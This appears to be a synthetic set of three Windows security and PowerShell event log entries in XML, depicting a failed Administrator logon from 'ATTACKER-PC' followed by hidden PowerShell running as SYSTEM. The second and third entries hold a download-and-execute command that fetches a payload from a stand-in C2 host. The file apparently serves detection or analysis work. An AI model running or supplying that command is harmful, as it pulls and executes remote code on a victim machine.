<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
      <EventID>4625</EventID>
      <Version>0</Version>
      <Level>0</Level>
      <Task>12544</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8010000000000000</Keywords>
      <TimeCreated SystemTime="2025-04-05T14:23:15.1234567Z"/>
      <EventRecordID>12345</EventRecordID>
      <Correlation/>
      <Execution ProcessID="666" ThreadID="777"/>
      <Channel>Security</Channel>
      <Computer>WIN-DESKTOP.local</Computer>
      <Security/>
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-0-0</Data>
      <Data Name="SubjectUserName">-</Data>
      <Data Name="SubjectDomainName">-</Data>
      <Data Name="SubjectLogonId">0x0</Data>
      <Data Name="TargetUserSid">S-1-5-21-1234567890-1234567890-1234567890-500</Data>
      <Data Name="TargetUserName">Administrator</Data>
      <Data Name="TargetDomainName">WIN-DESKTOP</Data>
      <Data Name="Status">0xc000006d</Data>
      <Data Name="FailureReason">%%2313</Data>
      <Data Name="SubStatus">0xc000006a</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="LogonProcessName">NtLmSsp</Data>
      <Data Name="AuthenticationPackageName">NTLM</Data>
      <Data Name="WorkstationName">ATTACKER-PC</Data>
      <Data Name="TransmittedServices">-</Data>
      <Data Name="LmPackageName">-</Data>
      <Data Name="KeyLength">0</Data>
      <Data Name="ProcessId">0x0</Data>
      <Data Name="ProcessName">-</Data>
      <Data Name="IpAddress">203.0.113.45</Data>
      <Data Name="IpPort">49500</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
      <EventID>4688</EventID>
      <Version>0</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2025-04-05T14:25:30.6543210Z"/>
      <EventRecordID>12346</EventRecordID>
      <Correlation/>
      <Execution ProcessID="888" ThreadID="999"/>
      <Channel>Security</Channel>
      <Computer>WIN-DESKTOP.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SYSTEM</Data>
      <Data Name="SubjectDomainName">NT AUTHORITY</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x1a2b</Data>
      <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x400</Data>
      <Data Name="CommandLine">powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malware.c2.server/payload.ps1')"</Data>
      <Data Name="TargetUserSid">S-1-5-18</Data>
      <Data Name="TargetUserName">SYSTEM</Data>
      <Data Name="TargetDomainName">NT AUTHORITY</Data>
      <Data Name="TargetLogonId">0x3e7</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\services.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-PowerShell" Guid="{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"/>
      <EventID>4104</EventID>
      <Version>1</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>1</Opcode>
      <Keywords>0x4000000000000000</Keywords>
      <TimeCreated SystemTime="2025-04-05T14:25:31.1111111Z"/>
      <EventRecordID>12347</EventRecordID>
      <Correlation ActivityID="{12345678-1234-1234-1234-123456789012}"/>
      <Execution ProcessID="1234" ThreadID="5678"/>
      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
      <Computer>WIN-DESKTOP.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="HostApplication">powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malware.c2.server/payload.ps1')</Data>
      <Data Name="EngineVersion">5.1.19041.1</Data>
      <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://malware.c2.server/payload.ps1')</Data>
      <Data Name="ScriptBlockId">{12345678-1234-1234-1234-123456789012}</Data>
    </EventData>
  </Event>
</Events>